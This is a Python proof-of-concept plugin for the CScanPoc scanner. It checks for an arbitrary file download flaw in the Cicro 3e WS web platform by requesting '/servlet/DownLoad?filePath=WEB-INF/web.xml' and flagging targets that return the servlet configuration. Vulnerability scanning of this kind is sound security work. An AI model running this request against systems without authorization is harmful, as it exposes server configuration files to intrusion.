# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Cicro_0000'  # 平台漏洞编号，留空
    name = '时光动态网站平台(Cicro 3e WS) 任意下载'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2013-10-07'  # 漏洞公布时间
    desc = '''
        时光动态网站平台(Cicro 3e WS) 任意下载
    '''  # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=035064'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Cicro'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'de9ab12e-48f2-4a42-a844-6120a0e82746'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg+"/servlet/DownLoad?filePath=WEB-INF/web.xml"
            code, head, res, errcode, _ = hh.http(url)
            if code == 200 and 'servlet-name' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
